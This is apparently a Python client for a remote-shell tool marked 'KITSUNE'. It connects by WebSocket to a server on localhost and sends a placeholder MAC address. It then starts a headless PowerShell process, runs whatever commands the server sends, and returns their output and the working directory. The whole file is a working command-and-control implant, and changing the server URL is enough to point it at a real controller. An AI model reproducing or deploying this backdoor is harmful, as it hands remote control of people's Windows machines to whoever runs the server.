import asyncio
import websockets
import json
import subprocess as sp

async def run():
	url = "ws://localhost:8765"

	try:
		async with websockets.connect(url, max_size = None, ping_interval = None) as websocket:
			print(f"Connected to {url}")

			device = {"MAC":"ff:ff:ff:ff:ff:ff"}
			await websocket.send(json.dumps(device))

			#Spawn Shell:
			proc = sp.Popen(
				["powershell.exe", "-NoProfile", "-NonInteractive"],
				stdout=sp.PIPE,
				stderr=sp.STDOUT,
				stdin=sp.PIPE,
				bufsize=0
			)

			#Command for forwarding output:
			async def ForwardOut():
				while True:

					#Reading from stdout.readline is blocking, wrap with asyncio.to_thread to not block event loop
					line = await asyncio.to_thread(proc.stdout.readline)
					if not line:
						break
					#await websocket.send(line.decode(errors="replace"))

			while True:
				MARKER = "KITSUNE"
			
				raw_content = [] #Contains all output raw

				pkg_content = {"cwd":"", "output":""} #The json to be sent back to server


				skip_lines = ["; (Get-Location).Path ;", "Windows PowerShell", "Install the latest PowerShell for new features and improvements!", "Copyright (C) Microsoft Corporation. All rights reserved."]
				
				#Wait for the server to send a command
				srv_cmd = await websocket.recv()
				srv_cmd = json.loads(srv_cmd)

				cmd = srv_cmd["ctx"]

				#print("============================================")

				#run the command:
				proc.stdin.write((cmd + f" ; (Get-Location).Path ; echo {MARKER}\n").encode())
				proc.stdin.flush()
				
				#Handle Output
				while True:
					skip = False

					line = await asyncio.to_thread(proc.stdout.readline)
					line = line.decode(errors='replace')
					#Break at the marker
					if line.strip() == MARKER:
						break

					#Skip not releveant lines:
					for seg in skip_lines:
						if seg in line:
							skip = True

					#Skip blank lines
					if line.strip() == "":
						skip = True

					if skip:
						continue

					#Append the line to data
					raw_content.append(line)

				#Pkg the data
				pkg_content["path"] = raw_content[-1].strip()
				pkg_content["output"] = raw_content[:-1]

				#Send to server
				await websocket.send(json.dumps(pkg_content))

				#for line in raw_content[:-1]:
				#	print(line.strip())

				#print("PATH: ", raw_content[-1].strip()) #Print last line containing path

				#print("============================================")

	except Exception as e:
		print(e)
		print("No Connection can be made...")

asyncio.run(run())